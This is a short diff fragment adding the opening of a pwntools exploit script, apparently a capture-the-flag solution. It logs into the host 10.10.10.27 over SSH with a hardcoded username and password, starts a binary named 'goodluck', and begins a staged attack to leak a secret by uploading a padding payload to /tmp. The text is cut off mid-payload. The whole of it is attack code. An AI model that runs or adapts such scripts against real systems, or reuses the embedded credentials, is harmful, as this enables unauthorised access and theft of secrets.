@@ -1,0 +1,1 @@
+wn import * sshConn = ssh ( host = " 10.10.10.27 " , user = " xalvas " , password = " 18547936..* " ) goodluck = sshConn . process ( " /home/xalvas/app/goodluck " ) fn = f " /tmp/ { randoms ( 10 ) } " ## Stage 1 - Leak hey.secret log . info ( f ' Writing Stage 1 exploit to { fn } ' ) sshConn . upload_data ( b " A " * 8 +
